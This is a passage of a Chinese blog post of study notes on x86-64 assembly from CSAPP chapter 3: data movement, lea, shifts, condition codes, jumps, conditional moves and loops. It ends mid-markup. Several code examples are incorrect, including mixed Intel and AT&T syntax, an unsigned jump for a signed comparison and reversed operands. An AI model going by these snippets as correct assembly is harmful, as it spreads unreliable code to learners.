title="操作数指示符"></a>操作数指示符</h3><p>大多数指令会有一个到两个操作数（operand），操作数可以是立即数（immediate），寄存器（register）或者是内存地址。具有两个操作数的指令会分源操作数（source operand）和目的操作数（destination operand）。</p><p>在有两个操作数的情况下：源操作数可以是以上三种的任意，目的操作数不能为立即数，并且源操作数和目的操作数不能同时为内存地址。</p><p>对于地址引用，存在一个公式</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250417220407-rwsxbsc.png" alt="image"></p><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov的意思就是将源操作数的值复制给目的操作数，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">;已知rax=5，rdi=8<br>mov %rdi，%rax  ;将rdi里面的内容复制到rax里面，现在rax=8，rdi=8<br></code></pre></td></tr></table></figure><p>当时根据我们上文中关于寄存器的知识，我们了解到，寄存器除了有八字节大小的，还可以使用一些小字节的寄存器，类似于eax，ax，al等。</p><p>如果我们的源操作数比较端，但是目的寄存器比较长的时候，例如</p><p>现在rax&#x3D;0x0000ffffffff4860，dl&#x3D;0x3b，现在我们需要将dl的值放入rax中</p><p>如果使用<code>mov dl,rax</code>​;这是一个非法指令，<code>mov</code>​ 指令要求源操作数和目标操作数大小一致</p><p>但是如果使用<code>mov dl,al</code>​;这样就只能修改最低位的一个字节，现在rax里面的值就是rax&#x3D;0x0000ffffffff483b</p><p>为了应对这种情况，我们就需要对源操作数进行扩展</p><p>这时候就有两种情况：</p><p>零（zero）扩展（movz）：就是把高位全部变为0，使用零扩展，在上述场景中，rax&#x3D;0x000000000000003b</p><p>对于扩展到不同大小，分为以下命令，寄存器部分大小必须和指令后两位相匹配</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419113820-lho605b.png" alt="image"></p><p>符号（sign）扩展（movs）：就是把高位补全为需要复制数的最高位（可能有点抽象）</p><p>例如对于-42用二进制表示为<code>11010110</code>​，现在它就是8位（1字节）的负数，使用符号扩展为64位（8字节），由于这个二进制的最高位为1，所以将它的高位全补位为1，即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">11111111 11111111 11111111 11111111 11111111 11111111 11111111 11010110<br></code></pre></td></tr></table></figure><p>转换为16进制就是0xffffffffffffffd6</p><p>同理，如果最高位为0，就将高位补充为0</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419114221-7umd0fw.png" alt="image"></p><h4 id="压入和弹出栈数据"><a href="#压入和弹出栈数据" class="headerlink" title="压入和弹出栈数据"></a>压入和弹出栈数据</h4><p>push指令就是将数据压入栈中</p><p>类似于这两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">pushq %rbp<br>=<br>subq $8，%rsp<br>movq %rbp,(%rsp)<br></code></pre></td></tr></table></figure><p>先将栈顶减去8，再把数据放到栈顶</p><p>而pop指令则和push指令相反</p><p>pop指令是将栈上的数据放到寄存器中</p><p>类似于这两条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">popq %rax<br>=<br>movq (%rsp),%rax<br>addq $8,%rsp<br></code></pre></td></tr></table></figure><p>看一下书上的图解</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419124703-cnyz19j.png" alt="image"></p><p>注意：push 的源操作数只能是立即数或者是寄存器， pop 的目的操作数只能是寄存器</p><h2 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h2><p>这些操作被分为四组：加载有效地址，一元操作（一个操作数），二元操作（两个操作数），位移</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250419144310-rxk9jqx.png" alt="image"></p><h3 id="加载有效地址"><a href="#加载有效地址" class="headerlink" title="加载有效地址"></a>加载有效地址</h3><p>加载有效地址指令lea是mov的变形。它的指令形式是从内存读取数据到寄存器，但是实际上它根本就没有引用内存。</p><p>lea的作用其实就是将括号里的值直接给目的数</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">lea (%rdi+8),%rax ;就是将rdi中存储的值加上8的值直接赋值给rax<br></code></pre></td></tr></table></figure><p>现在就有一个疑问了，lea和mov的区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;假设rdi=0x100 ，在0x108地址处的值为0x25<br>;如果使用mov<br>mov [%rdi+8],%rax<br>;此时，rax的值是0x25<br>;如果使用lea<br>lea [%rdi+8],%rax<br>;此时rax的值就是0x108<br></code></pre></td></tr></table></figure><p>由此，可以看出，lea没有访问rdi+8所指向的内存</p><p>此时，我们就要开始想了，如果我mov不加[]不就和lea作用一样了吗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">lea %rdi，%rax<br>mov %rdi，%rax<br></code></pre></td></tr></table></figure><p>这两条指令的作用是完全一样的</p><p>但是如果是下面两条指令,他们的作用还是一样的吗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">mov %rdi+8,%rax<br>lea (%rdi+8),%rax<br></code></pre></td></tr></table></figure><p>按理来说应该是同一个作用，<strong>但是，mov不支持这样的指令格式，所以不能这么使用</strong></p><p>（应该讲清楚了吧）</p><p>lea经常用于简单的算术表达式，采用书上的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">long scale(long x,long y,long z)&#123;<br>long t=x+4*y+12*z;<br>return t;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用lea进行算数运算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;x in %rdi,y in %rsi,z in %rdx<br>leaq (%rdi,%rsi,4),%rax  ;x+4*y<br>leaq (%rdx,%rdx,2),%rdx ;z+2*z=3*z<br>leaq (%rax,%rdx,4),%rax ;(x+4*y)+4*(3*z)=x+4*y+12*z<br>ret<br></code></pre></td></tr></table></figure><p>如果使用mov，指令数就会变大很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">movq    %rsi, %rax        ; rax = y<br>imulq   $4, %rax          ; rax = 4*y<br>movq    %rdx, %rcx        ; rcx = z<br>imulq   $12, %rcx         ; rcx = 12*z<br>addq    %rcx, %rax        ; rax += 12*z<br>addq    %rdi, %rax        ; rax += x<br>ret<br></code></pre></td></tr></table></figure><p>可以看到使用lea只需要三条指令就可以实现这个简单的计算，但是如果使用mov，实现这个简单的运算就需要六条指令，所以，lea经常用于简单计算。</p><h3 id="一元和二元操作"><a href="#一元和二元操作" class="headerlink" title="一元和二元操作"></a>一元和二元操作</h3><p>一元操作和二元操作就是看操作数是几个</p><p>例如：</p><p>一元操作</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422200057-smgjmvb.png" alt="image"></p><p>可以看到以上指令只有一个操作数，所以他们叫做一元操作</p><p>二元操作</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422200219-k2z8izk.png" alt="image"></p><p>可以看到以上指令拥有两个操作数，所以他们叫做二元操作</p><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422215319-9mjd9gu.png" alt="image"></p><p>位移操作，先给出位移量，然后第二项给出的是要位移的数。位移量可以是一个立即数，或者放在单字节寄存器%cl中</p><p>位移分为逻辑位移和算数位移，算数位移会考虑符号位，逻辑位移则不会考虑符号位，但是符号位一般保存在高位，所以算数左移和逻辑左移的功能是一样的</p><p>算数左移（sal）：左移一次，最低位补0</p><p>逻辑左移（shl）：左移一次，最低位补0</p><p>算数右移（sar）：右移一次，最高位补符号位</p><p>逻辑右移（shr）：右移一次，最高位补0</p><p>可以看到，sal和shl的作用是一样的</p><h3 id="特殊算数操作"><a href="#特殊算数操作" class="headerlink" title="特殊算数操作"></a>特殊算数操作</h3><p>当我们将两个64位数进行相乘的时候，就可能会出现128位数，但是目前的寄存器最大为64，该怎么保存128位的数呢</p><p>x86-64指令集对128位数的操作提供有限的支持</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250422224121-kgnr4vj.png" alt="image"></p><p>在我们之前看到的乘法和除法指令都是双操作数，他们代表所使用的数和产生的结果均没有超过64位，除此之外，x86-64指令集还提供单操作数的指令，如上图</p><p>对于乘法指令，要求一个参数必须放在寄存器%rax中，而另一个作为指令的源操作数给出，然后得出的结果高64位放在%rdx，低64位放在%rax中</p><p>对于除法指令，将寄存器%rdx放入被除数的高64位，%rax放入被除数的低64位，除数作为源操作数给出，将得出的商放入%rax，余数放在%rdx中</p><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>在之前的内容中，我们只研究了指令顺序执行的情况，但是顺序执行并不能够覆盖所有需求，我们希望程序有选择的执行一些代码，这个时候程序就不再是顺序执行，而是跳转执行</p><p>跳转分条件跳转和无条件跳转，无条件跳转执行使用jump指令改变一组机器码的执行顺序，jump指令控制程序必定跳转到它指定的位置。但是这样，程序运行与之前的顺序运行没什么区别，要实现分支结构和循环结构需要用到条件跳转了。</p><h3 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h3><p>除了整数寄存器，cpu还维护着一组单个位的条件码寄存器，他们描述了最近的算术或逻辑操作的属性。可以检查这些寄存器来执行条件分支指令。</p><p>常用的条件码如下：</p><p>　　CF：进位标志寄存器。最近的操作是最高位产生了进位。它可以记录无符号操作的溢出，当溢出时会被设为1。</p><p>　　ZF：零标志寄存器，最近的操作得出的结果为0。当计算结果为0时将会被设为1。</p><p>　　SF：符号标志寄存器，最近的操作得到的结果为负数。当计算结果为负数时会被设为1。</p><p>　　OF：溢出标志寄存器，最近的操作导致一个补码溢出（正溢出或负溢出）。当计算结果导致了补码溢出时，会被设为1。</p><p>lea指令不改变任何条件码，因为它是用来进行地址计算的。</p><p>inc和dec指令会设置溢出和零标志，但是不会改变进位标志。</p><p>除此之外，还有两个指令只用于修改条件码，但是不会修改操作数</p><h4 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h4><p>cmp指令本质上是两个值的比较，类似于sub指令，但是不保留结果，只更新条件码寄存器</p><p>cmp的操作数可以是寄存器，内存或则是立即数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">cmp S1,S2 ;S2-S1<br></code></pre></td></tr></table></figure><hr><p>这个具体的大小判断有一点点复杂，书上也只是简单的提了一下可以通过条件码寄存器判断出大小，由于之前一直没接触过条件码寄存器，对这一块很不了解，想深入看看，所以自己找资料补充一下。</p><p><a href="https://yimitumi.com/2020/04/17/%E4%BA%8C%E5%8D%81%E5%85%AB-CMP-%E6%8C%87%E4%BB%A4(%E6%AF%94%E8%BE%83%E6%8C%87%E4%BB%A4)-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">CMP 指令(比较指令)</a></p><p>如果S2-S1&#x3D;0，即S1&#x3D;S2，将ZF设置为1，PF（奇偶标志寄存器）设置为1</p><p>如果S2-S1!&#x3D;0,即S1!&#x3D;S2</p><p>无符号数比较</p><p>如果S1!&#x3D;S2,即ZF&#x3D;0</p><p>如果S2&lt;S1,则S2-S1会产生借位，所以CF&#x3D;1</p><p>如果S2&gt;S1,则S2-S1不会产生借位，所以CF&#x3D;0</p><p>综上，就可以根据ZF和CF两个条件码寄存器判断大小</p><p>有符号比较</p><p>如果OF&#x3D;0，说明没有产生溢出，说明此时的正负为真实的正负</p><p>如果S2&lt;S1,则S2-S1&lt;0，所以SF&#x3D;1</p><p>如果S2&gt;S1,则S2-S1&gt;0，所以SF&#x3D;0</p><p>如果OF&#x3D;1,说明产生了溢出，此时的正负为真实正负的相反结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">例如此时int S2=-64=1100 0000B，int S1=85=0101 0101B<br>本来S2-S1=-149=1 0110 1011B<br>但是我们定义的为int类型，只能保留到0110 1011B，这么一看，最高位就为0，即SF=0<br></code></pre></td></tr></table></figure><p>所以，当OF&#x3D;0时，SF&#x3D;1，说明S2&lt;S1,SF&#x3D;0，说明S2&gt;S1</p><p>当OF&#x3D;1时，SF&#x3D;1，说明S2&gt;S1,SF&#x3D;0，说明S2&lt;S1</p><hr><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>test指令本质上时and指令，但是不保留结果，只更新条件码</p><p>cmp的操作数可以是寄存器，内存或则是立即数</p><p>test指令的典型用法是两个操作数是一样的用于判断操作数的情况，或则其中一个操作数是另一个掩码，用来指示哪些位应该被测试</p><h3 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h3><p>条件码通常不会直接读取，尝试用的方法有三种：</p><p>1.根据条件码的某种组合，将一个字节设置位0或者1</p><p>2.可以根据条件跳转到程序的某个其他部分</p><p>3.可以有条件地传送数据</p><p>它们一般使用的常用后缀（下表是<a href="https://xia0ji233.pro/2022/09/22/CSAPP_3/">xia0ji233</a>师傅整理出的，借鉴一下）</p><table><thead><tr><th>指令后缀</th><th>同义后缀</th><th>条件码</th><th>设置条件</th><th>英文释义</th></tr></thead><tbody><tr><td>e</td><td>z</td><td>ZF==1</td><td>相等（零）</td><td>equal（zero）</td></tr><tr><td>ne</td><td>nz</td><td>ZF==0</td><td>不相等（不为零）</td><td>not equal（not zero）</td></tr><tr><td>s</td><td>&#x2F;</td><td>SF==1</td><td>为负数</td><td>sign（with -）</td></tr><tr><td>ns</td><td>&#x2F;</td><td>SF==0</td><td>为非负数</td><td>not sign（without -）</td></tr><tr><td>g</td><td>nle</td><td>(SF^OF)==0&amp;ZF==0</td><td>有符号大于</td><td>greater（not [less or equal]）</td></tr><tr><td>ge</td><td>nl</td><td>(SF^OF)==0</td><td>有符号大于等于</td><td>greater or equal（not less）</td></tr><tr><td>l</td><td>nge</td><td>(SF^OF)==1</td><td>有符号小于</td><td>less （not [greater or equal]）</td></tr><tr><td>le</td><td>ng</td><td>(SF^OF)==1|ZF</td><td>有符号小于等于</td><td>less or equal （not greater）</td></tr><tr><td>a</td><td>nbe</td><td>CF==0&amp;ZF==0</td><td>无符号大于</td><td>above （not [below or equal]）</td></tr><tr><td>ae</td><td>nb</td><td>CF==0</td><td>无符号大于等于</td><td>above or equal （not below）</td></tr><tr><td>b</td><td>nae</td><td>CF==1</td><td>无符号小于</td><td>below （not [above or equal]）</td></tr><tr><td>be</td><td>na</td><td>CF|ZF==1</td><td>无符号小于等于</td><td>below or equal （not above）</td></tr></tbody></table><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>我们将第一种情况的指令设置为set指令</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250425144546-ylcbypx.png" alt="image"></p><p>需要注意的是这些指令的后缀表示不同的条件而不是操作数的大小</p><p>一条set指令的目的操作数是低位单字节寄存器或则是一个字节的内存地址，指令会将这个字节设置为0或则1</p><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>无条件跳转：jmp</p><p>直接跳转，即跳转目标作为指令的一部分汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;例如<br> jmp .l1<br> pushq %rdx<br>.l1:<br> popq %rdx<br></code></pre></td></tr></table></figure><p>间接跳转，即跳转目标是从寄存器或则内存位置读出，间接跳转的写法是’*’后跟一个操作数指示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">;例如<br>jmp *%rax ;以rax内的值作为地址跳转<br>jmp *(%rax) ;以rax指向地址中的值作为地址跳转<br></code></pre></td></tr></table></figure><p>有条件跳转：</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250425153828-u7y0rz7.png" alt="image"></p><p>条件跳转只能为直接跳转</p><h3 id="跳转指令编码"><a href="#跳转指令编码" class="headerlink" title="跳转指令编码"></a>跳转指令编码</h3><p>跳转指令表面上是要指定一个绝对地址，但是实际上编码的时候是采用了偏移量的方式去编码，它会根据跳转指令所编码的值去对自己的 %rip 寄存器加或者是减去一个偏移量，但是需要注意的是，偏移量是从下一条指令开始计算的，这也就是为什么 jmp 如果后面编码值为 0 不会产生一个死循环。</p><h3 id="用条件控制来实现条件分支"><a href="#用条件控制来实现条件分支" class="headerlink" title="用条件控制来实现条件分支"></a>用条件控制来实现条件分支</h3><p>对于一般的条件语句if</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">cmp</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>&#123;<br><span class="hljs-comment">//x in %rdi,y in %rsi</span><br>    <span class="hljs-keyword">if</span>(x&gt;y)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.code<br>cmp proc<br>    mov $0,%rax<br>    cmp %rsi,%rdi<br>    jbe L1<br>    mov $1,%rax<br>L1:<br>    ret<br>cmp endp<br>end<br></code></pre></td></tr></table></figure><p>如果有 if … else … 语句的话，一般采用条件跳转和无条件跳转组合的方式去实现，比如如下的表达式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(expr)&#123;<br>    truepart<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    falsepart<br>&#125;<br></code></pre></td></tr></table></figure><p>我们进行编译之后大概率会产生如下的汇编语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test %rdi,%rdi<br>jz L1<br>//truepart<br>jmp done<br>L1:<br>//falsepart<br>done:<br>//over<br></code></pre></td></tr></table></figure><h4 id="条件传送语句实现条件分支"><a href="#条件传送语句实现条件分支" class="headerlink" title="条件传送语句实现条件分支"></a>条件传送语句实现条件分支</h4><p>条件传送指令就和上面两类条件指令一模一样，符合条件时传送，不符合条件时不传送。</p><p>同样，如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//x in %rdi,y in %rsi</span><br>    <span class="hljs-type">int</span> z;<br>    <span class="hljs-keyword">if</span>(x&gt;y)&#123;<br>        z=x-y;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        z=y-x;<br>    &#125;<br>    <span class="hljs-keyword">return</span> z<br>&#125;<br></code></pre></td></tr></table></figure><p>我们使用条件跳转语句可以很轻松地实现上述逻辑，但是我们也可以使用条件传送语句，事先算出两个部分 z 的值，先赋值假设正确的值，再用条件传送语句判断错误的条件赋值。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250427014852-p5y0u1r.png" alt="image"></p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">movq %rdi,%rax<br>subq %rsi,%rax;let %rax=x-y<br>movq %rsi,%rbx<br>subq %rdi,%rbx;let %rbx=y-x<br>cmp %rsi,%rdi<br>cmovle %rbx,%rax;if x&lt;=y movq %rbx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>可能你会疑问，这样子效率会不会遍低，因为如果运算更复杂一点，我需要把两个值都算出来，执行的指令会变多。确实，条件跳转比条件转移比起来执行的指令少，而且能泛用性广，举个例子：如果 if … else … 里面有其它语句，比如输出语句，那么我们条件传送指令显然就不能用，而条件跳转能应对这种情况。</p><p>但是条件传送实现的条件分支比条件转移实现的分支运行速度快。你可能很惊讶，为什么执行的指令多反而运行速度还快了，那是因为当今的 CPU 都是流水作业，一个指令的执行分为五个步骤，它同一时间可以执行五条指令对应的不同操作。而流水作业的前提条件是我能清楚地知道我接下来要执行的代码，如果我都不知道我接下来要执行什么代码，那么我肯定不能很好的运用流水作业了。</p><p>条件控制语句在执行完毕之前，谁也不知道它是跳转或者不跳转，也就无法知道它接下来要执行的指令，我们只能选择等待条件跳转指令执行完毕再次填充指令流水作业，速度自然就慢了。而条件转移并不改变指令的执行顺序，因此它依然能利用 CPU 的流水作业。</p><table><thead><tr><th>实现分支的方式</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>条件跳转</td><td>能应对所有分支情况，执行的指令较少</td><td>执行速度慢，不能很好的利用CPU的指令流水</td></tr><tr><td>条件传送</td><td>执行速度快，能很好的利用CPU的流水作业</td><td>不能应对所有的分支状况，需要把所有的情况提前计算，执行的指令较多</td></tr></tbody></table><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>高级语言中，除了顺序，选择以外，还有一种结构就是循环结构了，但是事实上我们依然可以通过条件转移的方式实现循环的效果，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">movq $10,%rcx;set loop time<br>do:<br>    ;do something<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    jns do<br></code></pre></td></tr></table></figure><p>以上例程可以循环10次执行，并且可以通过修改立即数 $10 来改变循环次数。</p><p>把它转为 C 语言来写就很像我们的 do-while 循环语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-comment">//something</span><br>        i--;<br>    &#125;<span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么除了 do - while 我们还有 while，for 三种类型的循环。</p><p>它们的模板分别是什么样的呢，我们来看看。</p><p>while 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">//something</span><br>        i--;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">    movq $10,%rcx<br>do:<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    js end<br>    ;do something<br>    jmp do<br>end:<br>    ret<br></code></pre></td></tr></table></figure><p>for 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>        <span class="hljs-comment">//something</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">movq %rcx,0<br>do:<br>    ;something<br>    addq %rcx,$1<br>    cmpq $10,%rcx<br>    jl do<br></code></pre></td></tr></table></figure><p>如果循环语句中有 continue，我们就跳过循环体中的所有逻辑，直接到循环条件判断和循环变量的修改，如果有 break 我们直接跳出循环即可。</p><p>要点：<strong>掌握循环结构的写法和循环的判断</strong>。</p><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><p>其实有人说，switch 就可以理解为 if elseif else if … 的形式，其实从实现来说，两者并没有太大的差别，但是执行效率上会有巨大差别，如果语句在第 n+1 个条件成立了，那么程序进行了 n+1 次判断。而 switch 语句在多数情况下（case语句超过四条，值的跨度小）并没有使用条件转移来区分各个值之间的跳转，当然它会区分一般值和默认值（default），一般值我们使用跳转表的形式实现。</p><p>比如如下的语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> test&#123;<br>    <span class="hljs-type">long</span> val=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">switch</span>(n)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            val+=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            val-=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            val*=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            val-=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            val++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>将它翻译为汇编语言之后可能会出现这样的逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 